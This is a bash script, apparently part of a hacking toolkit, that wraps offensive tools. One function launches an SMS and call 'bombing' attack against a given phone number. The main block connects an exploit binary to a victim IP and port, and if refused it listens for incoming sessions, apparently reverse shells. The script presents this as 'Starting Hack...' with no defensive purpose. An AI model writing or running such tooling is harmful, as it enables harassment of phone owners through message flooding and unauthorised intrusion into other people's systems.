source $PODGL/lib/fsh.cfg.sh
source $PODGL/lib/colors

dexit(){
 exit
}

phone(){
 if [ "$1" == '' ];then
   cerr Please Enter A Phone Number With The Country Code
   exit 1
 fi
 cout Checking Digle Devices....
 if [ ! -f "$PODGL/dev/dev1/main.py" ];then
    cbn Phone Attacking Device Not Found
    exit 1
 fi
 sleep 1
 cby Device Found..!
 sleep 0.5
 cout "Attacking $1, Bombing Calls and SMS (Press CTRL-C To Stop)..."
 cd $PODGL/dev/dev1
 python3 main.py --target $1 --method SMS --time 60 --thread 10 &> /dev/null
 cd - &> /dev/null
}

if [ "$1" == '' ];then
trap dexit SIGINT
if   [ "$VICTIM" == '0.0.0.0' ] || [ "$VICTIM" == '' ];then
  cerr Error Target IP is not Defined, Execute info victim
  exit 1
elif [ "$PORT" == '' ];then
  cerr Error Target Port is not Defined, Execute info victim
  exit 1
fi
cout Starting Hack...
sleep 0.5
cout Automating Binaries....
sleep 0.3
printf "${green}☢ Trying$white to ${red}connect${white} With ${red}$VICTIM ${white}Port$red $PORT $purple\n"
sleep 0.1
$PODGL/bin/exploit connect $VICTIM $PORT
if [ "$?" == 2 ];then

  sleep 0.4
  cerr Connection Request Rejected..!
  sleep 0.4
  printf "${green}☢ ${cyan}Listening on port $red$PORT$cyan For Incoming Sessions.... $purple(Press CTRL+C To Stop)\n"

  $PODGL/bin/exploit listen 0.0.0.0 $PORT
  if [ "$?" == 4 ];then
     sleep 0.3
     cerr An Error Was Occured, Maybe Another Proccess is Using This Address
  fi
fi
else
$1 $2
fi
